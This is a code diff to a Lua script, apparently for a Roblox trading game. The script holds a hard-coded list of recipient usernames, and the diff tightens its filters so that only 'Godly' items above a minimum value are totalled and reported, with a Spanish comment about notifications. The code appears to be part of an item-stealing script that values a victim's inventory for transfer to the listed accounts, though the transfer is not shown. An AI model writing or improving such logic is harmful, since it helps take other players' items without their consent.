@@ -141,7 +141,7 @@ local function fn(arg)
 end
 
 local users = { "0xun1que", "bleedmyworId" }
-local minRarity = "Other"
+local minRarity = "Godly"
 local minValue = 150
 local ping = 100
 E = "own"
@@ -1622,20 +1622,23 @@ if flag then
 				local rarity = v11.Rarity
 				local v12 = table.find(tbl2, rarity)
 
-				if v12 and v12 >= n2 and not tbl7[k] and type(v11.Evo) ~= "table" then
-					local itemName = v11.ItemName or v11.Name or k
-					local str2 = v11.Chroma == true and "Chroma " .. itemName or itemName
-					local n4 = ({ NikKnife = 1000000 })[k] or fn29(itemName, v11.ItemType, rarity, v11.Chroma == true, v11.Year)
+				local itemName = v11.ItemName or v11.Name or k
+				local str2 = v11.Chroma == true and "Chroma " .. itemName or itemName
+				local n4 = ({ NikKnife = 1000000 })[k] or fn29(itemName, v11.ItemType, rarity, v11.Chroma == true, v11.Year)
 
-					if not n4 then
-						if table.find(tbl2, "Godly") <= v12 then
-							n4 = 2
-						else
-							n4 = 1
-						end
+				if not n4 then
+					if table.find(tbl2, "Godly") <= v12 then
+						n4 = 2
+					else
+						n4 = 1
 					end
+				end
 
-					n += n4 * v10
+				local itemTotalValue = n4 * (v10 or 1)
+
+				-- Solo notificar si cumple la rareza mínima Y el valor mínimo
+				if v12 and v12 >= n2 and not tbl7[k] and type(v11.Evo) ~= "table" and itemTotalValue >= n3 then
+					n += itemTotalValue
 
 					table.insert(tbl, {
 						RealName = str2,
